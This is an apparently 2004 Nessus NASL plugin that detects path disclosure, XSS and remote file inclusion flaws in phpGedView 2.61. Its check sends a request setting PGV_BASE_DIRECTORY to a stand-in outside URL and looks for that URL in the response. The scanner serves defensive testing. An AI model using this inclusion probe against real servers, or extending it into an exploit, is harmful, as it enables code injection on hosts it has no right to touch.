#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: Vietnamese Security Group [security@security.com.vn]
# Subject: Vuln in PHPGEDVIEW 2.61 Multi-Problem
# Date: Tuesday 06/01/2004 08:20
#
#

if(description)
{
  script_id(11982);
  script_version("$Revision: 1.4 $");
  name["english"] = "phpGedView Code injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running phpGedView, a set of CGI scripts which
parse GEDCOM 5.5 genealogy files and display them on the internet in a 
format similar to desktop programs.

There are multiple vulnerabilities in this product :
- A path disclosure vulnerability, which will give more information
  about this host to a remote attacker

- A cross site scripting vulnerability, which may allow an attacker
  inject malicious HTML code in it 

- A code injection vulnerability, which may allow an attacker to make
  this server execute arbitrary PHP code hosted on a third party website.

Solution : Upgrade to the latest version of this software
Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect phpGedView Include() Vulnerability";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;

port = get_http_port(default:80);

if (!get_port_state(port) ) exit(0);
if (!can_host_php(port:port) ) exit(0);

function check_dir(path)
{
 req = http_get(item:string(path, "/authentication_index.php?PGV_BASE_DIRECTORY=http://xxxxxxx/"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);

 if ("http://xxxxxxx/authenticate.php" >< res ) 
 {
  security_hole(port);
  exit(0);
 }
}

foreach dir (cgi_dirs())
{
check_dir(path:dir);
}

